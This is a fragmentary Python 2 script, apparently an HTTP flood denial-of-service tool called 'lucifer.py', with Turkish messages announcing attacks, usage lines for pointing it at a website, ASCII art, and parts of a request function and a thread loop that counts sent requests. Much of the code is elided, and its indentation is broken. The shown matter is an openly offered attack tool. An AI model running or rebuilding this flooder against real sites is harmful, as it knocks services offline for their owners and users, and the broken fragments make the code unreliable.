...
def usage():
	...
	print 'Saldirmak Icin:'
        print '#Windows: lucifer.py http://www.site.com/'
        print '#Linux: python lucifer.py http://www.site.com/'
        print '---------------------------------------------------'
	print '     # Producer By SophiyaNato       #'
	print '     # Thanks For Mihanech & Ruby.jr #'		
...
(\/  || ))/ ( | -- - -- |  | )) )  \(( 
 ...
 [1.000.000] Iblis Harekete Saldiriya Hazir...
"""
print '---------------------------------------------------'
...
def httpcall(url):
	...
	try:
			...
			#print e.code
			set_flag(1)
 			print 'Lucifer baglanti paketleri yukluyor...'
			code=500
	...
	def run(self):
		...
		while flag==0:
			if (previous+100<request_counter) & (previous<>request_counter):
				print "%d Iblis Saldiriya Basladi" % (request_counter)
				previous=request_counter
		if flag==2:
